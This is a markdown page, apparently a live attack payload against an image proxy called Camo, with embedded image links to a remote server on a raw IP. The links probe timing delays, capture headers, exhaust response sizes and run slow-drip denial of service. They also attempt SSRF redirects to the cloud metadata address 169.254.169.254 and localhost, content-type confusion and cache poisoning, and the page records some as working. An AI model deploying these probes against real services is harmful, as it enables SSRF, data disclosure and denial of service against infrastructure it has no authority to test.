# v53: Header Analysis & Full Route Testing

> **MAJOR FINDING**: Camo timing attacks work! Server waited 5 seconds.
> BrokenPipeError on large files = Camo has response size limit!
> All requests log to `/tmp/h.log` for header analysis.

---

## 1. Timing Attacks (Confirmed Working) ⏱️

### 10 second delay (extreme test)
![time10](http://164.90.187.218.nip.io:8888/timing?delay=10)

### 15 second delay (timeout boundary test)
![time15](http://164.90.187.218.nip.io:8888/timing?delay=15)

### 30 second delay (timeout boundary)
![time30](http://164.90.187.218.nip.io:8888/timing?delay=30)

---

## 2. Header Capture (Information Disclosure) 🔍

### What headers does Camo send?
![headers](http://164.90.187.218.nip.io:8888/headers)

---

## 3. Response Size Testing 📦

### 10KB
![size10k](http://164.90.187.218.nip.io:8888/size?bytes=10000)

### 100KB
![size100k](http://164.90.187.218.nip.io:8888/size?bytes=100000)

### 500KB
![size500k](http://164.90.187.218.nip.io:8888/size?bytes=500000)

### 1MB (Previous test showed BrokenPipe)
![size1m](http://164.90.187.218.nip.io:8888/size?bytes=1000000)

### 5MB (Testing upper limit)
![size5m](http://164.90.187.218.nip.io:8888/size?bytes=5000000)

---

## 4. Slow Response (DoS/Timeout) 🐌

### Slow drip 10 sec
![slow10](http://164.90.187.218.nip.io:8888/slow?duration=10)

### Slow drip 30 sec
![slow30](http://164.90.187.218.nip.io:8888/slow?duration=30)

### Slow drip 60 sec
![slow60](http://164.90.187.218.nip.io:8888/slow?duration=60)

---

## 5. Redirect Tests (Confirmed NOT followed) ↪️

### 302 to External
![redir302](http://164.90.187.218.nip.io:8888/redir?code=302&to=https://example.com)

### 301 Permanent to Internal
![redir301](http://164.90.187.218.nip.io:8888/redir?code=301&to=http://169.254.169.254/latest/meta-data/)

### 307 Temporary Redirect
![redir307](http://164.90.187.218.nip.io:8888/redir?code=307&to=http://localhost:80)

---

## 6. Content-Type Confusion 🎭

### Return JS payload as image
![jsimage](http://164.90.187.218.nip.io:8888/confusion?type=js)

### Return HTML as image
![htmlimage](http://164.90.187.218.nip.io:8888/confusion?type=html)

---

## 7. Cache Poisoning Test 🧪

### Unique random value with long max-age
![cache1](http://164.90.187.218.nip.io:8888/cache?id=test1)

### Second request (should be cached)
![cache2](http://164.90.187.218.nip.io:8888/cache?id=test1)

---

**v53** - Full Route Testing Suite
